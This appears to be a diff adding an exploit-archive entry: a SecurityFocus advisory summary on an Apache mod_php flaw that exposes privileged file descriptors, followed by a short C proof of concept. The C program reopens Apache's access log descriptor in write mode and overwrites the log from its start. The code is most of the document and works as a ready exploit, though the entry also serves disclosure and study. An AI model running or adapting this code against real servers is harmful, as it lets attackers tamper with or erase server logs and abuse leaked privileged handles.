@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/9302/info
+ 
+Reportedly, the Apache mod_php module may be prone to a vulnerability that may allow a local attacker to gain access to privileged file descriptors. As a result, the attacker may pose as a legitimate server and possibly steal or manipulate sensitive information.
+
+# apache's access_log can be overwritten with arbitrary content
+# from PHP called executables.
+# POC by frauk\x41ser && sk0L / SEC Consult 2006
+
+#include <unistd.h>
+#include <fcntl.h>
+
+#define LOGFD 7
+
+void main(){
+        fcntl(LOGFD, F_SETFL, O_WRONLY); // change mode from append to write
+        lseek(LOGFD, 0, SEEK_SET); // reposition to start of file
+        write(LOGFD,"hehe\n",5);
+}
+
